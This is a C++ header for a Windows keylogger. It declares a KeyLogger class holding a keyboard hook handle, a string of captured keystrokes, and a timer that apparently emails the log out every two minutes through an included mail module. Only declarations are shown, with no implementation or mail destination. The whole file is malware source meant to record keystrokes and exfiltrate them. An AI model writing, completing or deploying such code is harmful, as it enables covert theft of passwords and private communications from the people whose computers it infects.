#pragma once
#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyMap.h"
#include "Timer.h"
#include "Mail.h"

using namespace std;
void sendMailTimer();
class KeyLogger
{
public:
	KeyLogger() : _mailTimer(sendMailTimer, 2000*60)
	{
		this->_hook = NULL;
		this->_keylog = "";
	}
	string getKeyLog();
	~KeyLogger();
private:
	HHOOK _hook;// = NULL;
	string _keylog;// = "";
	Timer _mailTimer;
};

